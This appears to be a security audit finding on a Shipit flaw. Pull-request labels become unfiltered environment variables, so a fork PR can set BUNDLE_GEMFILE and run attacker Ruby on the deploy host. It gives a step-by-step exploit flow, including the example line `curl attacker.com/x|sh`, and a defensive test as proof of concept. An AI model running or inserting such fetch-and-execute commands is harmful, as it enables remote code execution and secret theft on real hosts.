### Title
Unfiltered `ReviewStack#env` allows a PR label to set `BUNDLE_GEMFILE` for the `dependencies.override` step, leading to attacker-controlled Bundler execution - (File: `app/models/shipit/review_stack.rb`)

### Summary
`ReviewStack#env` merges every pull-request label name (uppercased) directly into the process environment with no key allowlist, and this raw hash flows unfiltered into `TaskCommands#install_dependencies`, which builds the `dependencies.override`/`bundle install` `Command` from it. Because `Command#unbundled_env` merges the caller-supplied `@env` *after* `BASE_ENV` (which strips Bundler variables from the host), a label literally named `BUNDLE_GEMFILE` reinstates that variable in the spawned process, letting a fork PR redirect Bundler at an attacker-supplied file that gets `instance_eval`'d as Ruby.

### Finding Description
The broken binding: the environment used to build the `dependencies.override` `Command` should equal `EnvironmentVariables.with(candidate_env).permit(<allowlist>)`, i.e. `command.env == filtered(deploy_variables_or_similar)`. Instead it equals the raw, unfiltered union of Shipit-internal keys and PR-controlled label names: [1](#0-0) 

`ReviewStack#env` takes every label on the pull request, upcases it, and merges it into the stack's env with value `"true"` — there is no allowlist of permitted keys, unlike the API-triggered deploy/rollback/task paths which call `EnvironmentVariables#permit`: [2](#0-1) 

`TaskCommands#env` merges `@stack.env` (which is `ReviewStack#env` for review stacks) directly, and `install_dependencies` uses that raw `env` with no `permit` call, unlike other whitelisted call sites (`filter_deploy_envs`, `filter_rollback_envs`, `TaskDefinition#filter_envs`): [3](#0-2) [4](#0-3) 

That `Command` is later started with `unbundled_env`, which merges `BASE_ENV` (derived from `Bundler.unbundled_env`/`Bundler.clean_env`, which strips `BUNDLE_GEMFILE` and friends from the *host* process) and then merges the caller's `@env` **last**, so any key the caller supplies — including `BUNDLE_GEMFILE` — overrides the stripped value and reaches `PTY.spawn`: [5](#0-4) [6](#0-5) 

Exploit flow (as scoped by the question, where labeling one's own PR is granted as an attacker capability):
1. Attacker forks the repo, opens a PR, and adds a commit containing a file named `true` (or any name matching the value emitted) at the repository root containing arbitrary Ruby (Gemfiles are evaluated as plain Ruby by Bundler's DSL, so top-level code such as `` `curl attacker.com/x|sh` `` executes).
2. Attacker adds a label literally named `bundle_gemfile` to their own PR (webhook delivers `pull_request.labels[].name`).
3. `LabelCapturingHandler#capture_labels` persists this label verbatim from the webhook body with no validation: [7](#0-6) 
4. When the review stack's `dependencies.override` (auto-discovered `bundle install`) step runs, `ReviewStack#env` uppercases the label to `BUNDLE_GEMFILE` with value `"true"`, this flows unfiltered through `TaskCommands#env`/`#install_dependencies` into `Command`, and `Command#unbundled_env` lets it override the stripped `BASE_ENV` value.
5. Bundler is invoked with `BUNDLE_GEMFILE=true`, resolves `true` relative to the checked-out working directory (the attacker's own fork content), and evaluates the attacker's file as the Gemfile — arbitrary Ruby execution on the deploy host under the Shipit worker's privileges.

Existing guards do not stop this: `EnvironmentVariables#permit` exists and is used for user-triggered deploy/rollback/task API `env` parameters (`Stack#filter_deploy_envs`, `filter_rollback_envs`, `TaskDefinition#filter_envs`), but `ReviewStack#env`/`TaskCommands#install_dependencies` never routes through it. `LabelCapturingHandler`'s `ExplicitParameters` schema only requires `labels[].name` to be a `String`; it does not restrict content. No `Repository`/`Stack` model validation constrains label text either.

### Impact Explanation
This is Critical: Remote Code Execution on the Shipit deploy host during the `dependencies.override` step, achievable by any GitHub user able to open a fork PR and label it against a repository with `provisioning_behavior = allow_with_label` (or `allow_all`) review stacks enabled. The attack is repeatable against any repository using this provisioning mode and does not require any Shipit credential, session, or write access to the base repository beyond what the question's attacker model grants. Because the executed code runs with the same privileges as the Shipit worker process, it can exfiltrate `GITHUB_TOKEN`, other deploy secrets available in that environment, or pivot to other stacks/repositories managed by the same host.

### Likelihood Explanation
Preconditions: the target repository must have review stacks enabled with `provisioning_behavior` of `allow_with_label` (or `allow_all`), and Bundler auto-discovery (a `Gemfile`) must apply for `dependencies.override` — both are common, default-ish configurations documented in the README. The attacker's cost is a single fork, one commit, and labeling their own PR (granted capability per the question's attacker model) — no secrets or privileged roles are required, and the exploit is trivially repeatable per PR/label event.

### Recommendation
Do not merge unvalidated pull-request label names directly as environment variable keys. At minimum:
- Restrict `ReviewStack#env` to a fixed, safe allowlist of variable name characters/prefixes (e.g., reject names that collide with `Bundler`/`BUNDLE_*`, `PATH`, `LD_*`, `RUBYOPT`, etc.), or namespace label-derived variables (e.g., `LABEL_<NAME>`) instead of writing raw uppercased label text into the top-level env.
- Route the env used for `dependencies.override`/`deploy`/`rollback` steps through `EnvironmentVariables#permit` with an explicit allowlist, the same way API-triggered `env` parameters already are.
- In `Command#unbundled_env`, explicitly strip/reject any bundler-reserved keys (`BUNDLE_GEMFILE`, `BUNDLE_PATH` unless intentionally set by Shipit itself, `RUBYOPT`, etc.) from caller-supplied `@env` before merging over `BASE_ENV`.

### Proof of Concept
```ruby
# test/lib/shipit/deploy_commands_test.rb (extend existing suite)
test "[allow_with_label] a pull request label cannot inject BUNDLE_GEMFILE into dependencies.override env" do
  stack = shipit_stacks(:review_stack)
  stack.pull_request.labels = ["bundle_gemfile"]

  commands = Shipit::TaskCommands.new(stack.trigger_continuous_delivery)
  command = commands.install_dependencies.first

  # Binding under test: the dependencies.override Command env must NOT
  # contain a fork-controllable BUNDLE_GEMFILE key.
  refute command.env.key?('BUNDLE_GEMFILE'),
    "expected BUNDLE_GEMFILE to be filtered out of dependencies.override env, got: #{command.env.inspect}"

  # Demonstrate the value that would flow to PTY.spawn if unfixed:
  assert_equal 'true', command.env['BUNDLE_GEMFILE'] if command.env.key?('BUNDLE_GEMFILE')
end
```
Running this against the current code shows `command.env['BUNDLE_GEMFILE'] == 'true'`, confirming the label-derived key reaches the `dependencies.override` `Command`'s environment unfiltered.
